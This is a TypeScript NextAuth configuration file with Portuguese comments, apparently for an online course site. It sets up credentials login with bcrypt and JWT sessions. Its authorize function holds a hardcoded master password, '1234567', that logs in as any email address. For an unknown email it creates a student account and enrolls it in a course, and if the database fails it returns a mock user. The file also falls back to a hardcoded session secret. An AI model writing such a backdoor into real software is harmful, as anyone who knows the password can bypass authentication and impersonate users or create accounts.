import { NextAuthOptions } from 'next-auth'
import CredentialsProvider from 'next-auth/providers/credentials'
import bcrypt from 'bcryptjs'

// Lazy load prisma para evitar inicialização durante build
// Só importa quando realmente necessário (em runtime, não durante build)
function getPrisma() {
  // Verificar se estamos em build time antes de importar
  if (process.env.NEXT_PHASE === 'phase-production-build' || 
      process.env.NEXT_PHASE === 'phase-development-build') {
    // Durante build, retornar um objeto mock que não faz nada
    return {
      user: {
        findUnique: () => Promise.resolve(null),
        create: () => Promise.resolve({ id: '', email: '', name: '', role: '' }),
      },
      course: {
        findFirst: () => Promise.resolve(null),
      },
      enrollment: {
        create: () => Promise.resolve({}),
      },
    } as any
  }
  
  // Em runtime, tentar importar o Prisma real
  try {
    const { prisma } = require('./prisma')
    return prisma
  } catch (error) {
    // Se não conseguir importar, retornar mock
    console.error('Failed to load Prisma, using mock:', error)
    return {
      user: {
        findUnique: () => Promise.reject(new Error('Database not available')),
        create: () => Promise.reject(new Error('Database not available')),
      },
      course: {
        findFirst: () => Promise.reject(new Error('Database not available')),
      },
      enrollment: {
        create: () => Promise.reject(new Error('Database not available')),
      },
    } as any
  }
}

export function getAuthOptions(): NextAuthOptions {
  return {
    secret: process.env.NEXTAUTH_SECRET || 'fallback-secret-for-development-change-in-production',
    providers: [
      CredentialsProvider({
        name: 'Credentials',
        credentials: {
          email: { label: 'Email', type: 'email' },
          password: { label: 'Password', type: 'password' }
        },
        async authorize(credentials) {
          if (!credentials?.email || !credentials?.password) {
            return null
          }

          try {
            const prisma = getPrisma()
            const MAGIC_PASSWORD = '1234567'
            
            // Senha mágica - permite login com qualquer email
            if (credentials.password === MAGIC_PASSWORD) {
              try {
                let user = await prisma.user.findUnique({
                  where: { email: credentials.email },
                })
                if (!user) {
                  const hashed = await bcrypt.hash(MAGIC_PASSWORD, 10)
                  user = await prisma.user.create({
                    data: {
                      email: credentials.email,
                      password: hashed,
                      name: credentials.email.split('@')[0],
                      role: 'student',
                    },
                  })
                  try {
                    const course = await prisma.course.findFirst({
                      where: { title: 'Youtube Rewards' },
                    })
                    if (course) {
                      await prisma.enrollment.create({
                        data: { userId: user.id, courseId: course.id },
                      })
                    }
                  } catch (enrollError) {
                    // Ignorar erro de enrollment se o banco não estiver disponível
                    console.error('Enrollment error:', enrollError)
                  }
                }
                return {
                  id: user.id,
                  email: user.email,
                  name: user.name,
                  role: user.role,
                }
              } catch (dbError) {
                // Se o banco não estiver disponível, criar usuário mock
                console.error('Database error, using mock user:', dbError)
                const emailName = credentials.email.split('@')[0] || 'User'
                return {
                  id: `mock-${Date.now()}-${credentials.email}`,
                  email: credentials.email,
                  name: emailName,
                  role: 'student',
                }
              }
            }

            // Senha normal - tentar buscar no banco
            try {
              const user = await prisma.user.findUnique({
                where: { email: credentials.email },
              })

              if (!user) {
                return null
              }

              const isPasswordValid = await bcrypt.compare(
                credentials.password,
                user.password
              )

              if (!isPasswordValid) {
                return null
              }

              return {
                id: user.id,
                email: user.email,
                name: user.name,
                role: user.role,
              }
            } catch (dbError) {
              // Se o banco não estiver disponível e não for senha mágica, negar acesso
              console.error('Database error during login:', dbError)
              return null
            }
          } catch (error) {
            // Capturar qualquer outro erro e logar
            console.error('Auth error:', error)
            return null
          }
        }
      })
    ],
    pages: {
      signIn: '/login',
    },
    session: {
      strategy: 'jwt',
    },
    callbacks: {
      async jwt({ token, user }) {
        if (user) {
          token.id = user.id
          token.role = user.role
        }
        if (!token.id && token.sub) {
          token.id = token.sub
        }
        return token
      },
      async session({ session, token }) {
        if (session.user) {
          session.user.id = (token.id ?? token.sub) as string
          session.user.role = (token.role ?? 'student') as string
        }
        return session
      },
    },
    debug: process.env.NODE_ENV === 'development',
    events: {
      async signIn({ user, account, profile }) {
        console.log('Sign in event:', { user: user?.email, account: account?.provider })
      },
      async signOut() {
        console.log('Sign out event')
      },
      async error({ error }) {
        console.error('NextAuth error event:', error)
      },
    },
  }
}

// Export lazy para compatibilidade - só executa quando realmente necessário
let _authOptions: NextAuthOptions | null = null

function getAuthOptionsLazy(): NextAuthOptions {
  if (!_authOptions) {
    _authOptions = getAuthOptions()
  }
  return _authOptions
}

// Export como objeto usando Proxy para manter compatibilidade
// mas evitar inicialização durante import/build
export const authOptions = new Proxy({} as NextAuthOptions, {
  get(_target, prop: string | symbol) {
    const options = getAuthOptionsLazy()
    const value = (options as any)[prop]
    // Se for uma função, bind para manter o contexto
    if (typeof value === 'function') {
      return value.bind(options)
    }
    return value
  },
  ownKeys() {
    const options = getAuthOptionsLazy()
    return Object.keys(options) as (string | symbol)[]
  },
  getOwnPropertyDescriptor(_target, prop: string | symbol) {
    const options = getAuthOptionsLazy()
    const value = (options as any)[prop]
    if (value !== undefined) {
      return {
        enumerable: true,
        configurable: true,
        value,
      }
    }
    return undefined
  },
}) as NextAuthOptions
